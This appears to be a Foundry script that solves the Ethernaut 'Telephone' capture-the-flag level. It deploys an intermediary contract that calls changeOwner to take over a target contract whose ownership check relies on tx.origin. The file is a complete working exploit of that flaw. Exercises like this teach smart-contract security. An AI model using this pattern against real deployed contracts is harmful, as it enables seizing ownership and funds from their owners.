// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "src/Telephone.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract TelephoneAttack {
    Telephone public telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
    }

    function attack() public {
        telephone.changeOwner(tx.origin);
        console.log("Yeni owner:", telephone.owner());
    }
}

contract TelephoneSolution is Script {
    Telephone public telephone = Telephone(0xB8eB3b99cFAFE49DFB19a57FadbeceB564438f76);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Current owner:", telephone.owner());
        // telephone.changeOwner(vm.envAddress("MY_ADDRESS"));
        TelephoneAttack attackContract = new TelephoneAttack(telephone);
        attackContract.attack();
        console.log("Current owner:", telephone.owner());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
